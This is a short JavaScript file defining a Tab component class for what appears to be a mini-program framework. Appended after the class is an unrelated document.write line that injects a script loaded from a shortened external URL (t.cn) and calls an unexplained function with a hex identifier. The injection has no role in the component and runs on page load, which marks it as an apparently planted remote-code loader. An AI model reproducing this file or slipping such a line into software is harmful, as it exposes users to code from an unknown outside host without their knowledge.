export default class Tab{
  constructor (props={}) {
    this.options = {
      context: {}
    }
  }

  _init (ele, res) {
    const pages = getCurrentPages();
    const ctx = pages[pages.length - 1];
    const tab = ctx.selectComponent(ele);
    this.options.context = tab
    tab.doInitTabData(res)
  }
}
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
